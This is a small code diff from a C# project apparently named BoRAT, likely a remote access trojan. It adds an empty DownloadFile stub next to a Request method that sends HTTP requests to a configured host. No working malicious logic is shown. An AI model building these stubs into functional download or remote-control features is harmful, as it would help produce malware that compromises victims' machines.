@@ -56,6 +56,11 @@ namespace BoRAT.Core.Network
 
         }
 
+        public static void DownloadFile(string link)
+        {
+
+        }
+
         public static void Request(string lol)
         {
             HttpWebRequest request = (HttpWebRequest)WebRequest.Create(host);
